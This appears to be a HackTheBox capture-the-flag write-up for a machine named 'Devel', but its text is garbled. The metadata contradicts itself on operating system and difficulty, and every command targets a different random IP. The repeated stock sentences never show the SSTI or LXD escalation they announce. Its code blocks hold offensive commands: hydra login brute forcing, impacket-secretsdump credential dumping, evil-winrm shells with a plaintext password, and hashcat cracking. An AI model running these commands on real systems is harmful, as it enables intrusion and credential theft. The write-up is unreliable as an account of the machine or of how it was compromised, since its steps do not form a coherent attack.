---
TitleSEO: "HackTheBox — Devel (Medium Linux) | ZureFX"
TitlePost: "HackTheBox — Devel (Medium Linux)"
Author: "ZureFX"
Description: "Full writeup for HackTheBox Devel. SSTI and LXD Privilege Escalation to achieve medium compromise on Linux."
Keywords: "linux, hard, windows, active directory"
URL: "https://zurefx.github.io/writeups/htb-devel-489.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-devel-489/"
Date: "2024-06-05"
Tags: "Linux, Hard, Windows, Active Directory"
Section: "writeups"
Lang: "en"
main_img: "htb-devel-489"
Permalink: "/writeups/htb-devel-489.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Devel** is rated **Medium** on HackTheBox. It runs **Linux** and the IP address during this analysis was `10.81.220.94`.

### Objectives

The web application was vulnerable to Server-Side Template Injection (SSTI). The target system was identified as running a vulnerable version of the service.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
crackmapexec smb 10.28.86.18 -u administrator -p 'P@ssw0rd!' --shares
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.37.148.175/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.125.227.80/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.26.109.82 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The database credentials were hardcoded in the application source code. The backup files contained sensitive information that should not have been accessible.

### Service Enumeration

Authentication bypass was achieved through careful manipulation of the login mechanism. The backup files contained sensitive information that should not have been accessible. Weak file permissions allowed modification of critical system files.

```bash
gobuster dir -u http://10.101.44.199/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
nmap -sCV -p139,8888,110 10.100.73.7 -oN scan.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.25.15.200/FUZZ
```

Authentication bypass was achieved through careful manipulation of the login mechanism. Lateral movement was facilitated by reusing discovered credentials across services.

### SMB Enumeration

The database credentials were hardcoded in the application source code. The service account had excessive permissions assigned in Active Directory.

```bash
evil-winrm -i 10.121.55.136 -u administrator -p 'P@ssw0rd!'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i 10.109.231.187 -u administrator -p 'P@ssw0rd!'
gobuster dir -u http://10.36.34.141/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The web application was vulnerable to Server-Side Template Injection (SSTI). Authentication bypass was achieved through careful manipulation of the login mechanism. The database credentials were hardcoded in the application source code.

## Exploitation

### Vulnerability Identification

The service account had excessive permissions assigned in Active Directory. The service was running without proper input validation, leading to injection vulnerabilities. Post-exploitation enumeration revealed a path to domain administrator privileges.

Key finding: **LXD Privilege Escalation**.

Group Policy Preferences contained encrypted but recoverable credentials. The service was running without proper input validation, leading to injection vulnerabilities.

### Initial Access

The application stored sensitive credentials in an unencrypted configuration file. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.74.101.60
evil-winrm -i 10.129.28.152 -u administrator -p 'P@ssw0rd!'
```

The application stored sensitive credentials in an unencrypted configuration file. Unconstrained delegation was enabled on the compromised machine. Lateral movement was facilitated by reusing discovered credentials across services.

## Privilege Escalation

### Enumeration

The database credentials were hardcoded in the application source code. The application stored sensitive credentials in an unencrypted configuration file. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
gobuster dir -u http://10.32.252.125/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
impacket-secretsdump administrator:'P@ssw0rd!'@10.110.225.51
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.93.41.147/FUZZ
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### Exploitation

Post-exploitation enumeration revealed a path to domain administrator privileges. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.51.63.194 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.11.6.35
```

The service was running without proper input validation, leading to injection vulnerabilities. Post-exploitation enumeration revealed a path to domain administrator privileges.

### Root/SYSTEM

Successfully obtained **root** access on the target.

Unconstrained delegation was enabled on the compromised machine. The service account had excessive permissions assigned in Active Directory.

## Summary

### Tools Used

- `crackmapexec`
- `impacket`
- `gobuster`
- `evil-winrm`
- `psexec`
- `nikto`
- `wpscan`
- `smbexec`

### Key Takeaways

- SSTI
- LXD Privilege Escalation
- ACL Abuse
